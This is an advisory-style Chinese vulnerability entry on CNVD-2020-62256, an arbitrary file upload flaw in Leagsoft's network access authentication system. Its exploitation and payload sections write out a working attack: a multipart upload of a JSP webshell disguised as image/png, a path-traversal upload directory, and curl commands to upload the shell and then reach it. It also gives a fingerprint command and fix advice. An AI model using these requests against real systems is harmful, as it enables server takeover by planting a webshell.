## 漏洞描述

深圳市联软科技股份有限公司入网身份认证系统存在任意文件上传漏洞（CNVD-2020-62256）。CNVD 记录显示攻击者可利用该漏洞上传 webshell，进而获得服务器权限。CNVD 未公开具体受影响接口与 PoC，本条目为公告级记录。

**注意**：本条目只覆盖 CNVD-2020-62256（入网身份认证系统）；Leagsoft EMM、安全数据交换系统的漏洞各自独立编号，不要合并或互设别名。

## 影响版本

- 联软入网身份认证系统，CNVD 未披露精确版本

## 前置条件

- 目标为联软入网身份认证系统
- CNVD 未披露认证要求，实际核验前需确认授权边界

## 利用步骤

1. 识别目标为联软入网身份认证系统（联软准入，登录页/厂商特征）
2. HW2020 公开跟踪文章披露该任意文件上传端点为 `POST /uai/download/uploadfileToPath.htm`：multipart 表单上传文件，并通过 `uploadpath` 参数控制写入目录（示例写入 `../webapps/notifymsg/devreport/`）
3. 上传 JSP webshell 到 Web 可达目录后访问确认生效（原公开文章利用黑名单后缀绕过，上传时 Content-Type 伪装为 image/png）
4. 说明：该公开文章为 HW2020 期间跟踪记录，产品/时间与 CNVD-2020-62256 对应，但厂商未逐项确认，实际验证前请先确认授权边界

## Payload

```http
POST /uai/download/uploadfileToPath.htm HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxxxxxxxx

------WebKitFormBoundaryxxxxxxxx
Content-Disposition: form-data; name="input_localfile"; filename="shell.jsp"
Content-Type: image/png

<JSP 内容，仅授权测试使用>
------WebKitFormBoundaryxxxxxxxx
Content-Disposition: form-data; name="uploadpath"

../webapps/notifymsg/devreport/
------WebKitFormBoundaryxxxxxxxx--
```

```bash
# 等价 curl 形式（仅限授权测试；boundary 由 curl 自动生成，需保持一致）
curl -s -X POST "http://target/uai/download/uploadfileToPath.htm" \
  -F "input_localfile=@shell.jsp;type=image/png" \
  -F "uploadpath=../webapps/notifymsg/devreport/" \
  --max-time 10
# 上传后访问写入的 webshell（路径按 uploadpath 实际拼接）
curl -s "http://target/notifymsg/devreport/shell.jsp"
```

## 验证方法

1. 识别目标是否联软入网身份认证系统（登录页/厂商特征）
2. 依据 CNVD 记录，在授权范围内排查上传类功能（驱动/补丁包/客户端安装包上传等）
3. 验证是否可上传非白名单文件、文件是否保存在 Web 可达目录
4. 公开细节有限，以厂商补丁与资产自查为准

## 指纹确认

```bash
curl -s "http://target/" | grep -iE "联软|leagsoft|入网认证|nac"
```

## 修复建议

1. 联系厂商获取补丁并升级
2. 上传接口增加类型白名单、内容校验与不可预测存储路径
3. 限制管理入口仅内网可达
